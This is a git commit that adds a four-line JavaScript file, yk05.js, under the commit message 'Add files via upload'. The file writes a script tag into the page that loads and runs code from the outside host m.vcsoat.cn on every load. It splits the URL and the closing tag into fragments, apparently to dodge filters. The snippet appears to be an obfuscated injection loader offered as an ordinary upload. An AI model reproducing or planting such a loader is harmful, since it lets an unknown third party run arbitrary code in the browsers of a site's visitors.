cbda881236e3469199f3bf77ff22a247f577e966
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-11-19 07:29:26 +0800

    Add files via upload

---
+++ yk05.js
@@ -0,0 +1,4 @@
+document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
+document.writeln('tps:')
+document.writeln('//m.vcsoat.cn/142/EX8NDYGmQ2JpXxHkQYLuUV.shtml?'+new Date().getTime()+'"')
+document.writeln('><\/scr' + 'ipt>')
